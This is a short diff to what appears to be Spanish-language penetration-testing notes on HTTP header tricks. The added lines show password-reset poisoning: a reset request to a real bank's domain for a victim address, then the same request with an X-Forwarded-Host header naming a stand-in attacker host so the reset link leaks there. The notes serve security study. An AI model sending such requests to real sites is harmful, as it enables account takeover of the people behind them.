@@ -102,3 +102,17 @@ Referer: example.com/admin
 ```
 ### X-Forwarded-For
 Differente IP
+
+### X-Forwarded-Host:
+```
+POST /reset-password HTTP/1.1
+Host: bancolombia.com
+email: victima@email.com
+```
+Redirecting to
+```
+POST /reset-password HTTP/1.1
+Host: bancolombia.com
+X-Forwarded-Host: atacante.com
+email: victima@email.com
+```
